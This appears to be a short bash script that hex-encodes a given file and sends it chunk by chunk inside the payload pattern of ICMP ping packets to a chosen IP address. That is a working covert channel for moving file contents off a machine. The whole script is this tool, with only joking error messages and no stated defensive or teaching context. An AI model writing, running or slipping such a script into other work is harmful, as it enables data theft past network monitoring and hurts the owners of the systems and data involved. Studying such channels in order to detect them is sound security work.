#!/bin/bash
#Args need to be 1:file 2:IP 3:Payload_size

PAYLOAD_SIZE=0

if [[ $# -lt 2 ]]; then 
	echo "Bad user, don't do that."
	exit 1
elif [[ $# -eq 2  ]]; then
	#echo "Good Job!"
	PAYLOAD_SIZE=15;
elif [[ $# -eq 3 ]]; then
	#echo "Oh look at you picking the payload size."
	PAYLOAD_SIZE=$(($3 - 1))
elif [[ $# -gt 3 ]]; then
	echo "Bad user, don't do that."
fi

#Making sure the payload_size works
#echo "$PAYLOAD_SIZE"

ping_message=$1

ping_IP=$2

for x in $(xxd -ps -c$PAYLOAD_SIZE $ping_message); do
	length=$(printf "%d" $((${#x} / 2 )))
	header=$(printf "%02x" $length)
	echo $(ping $ping_IP -c1 -p$header$x)
	echo " "
done
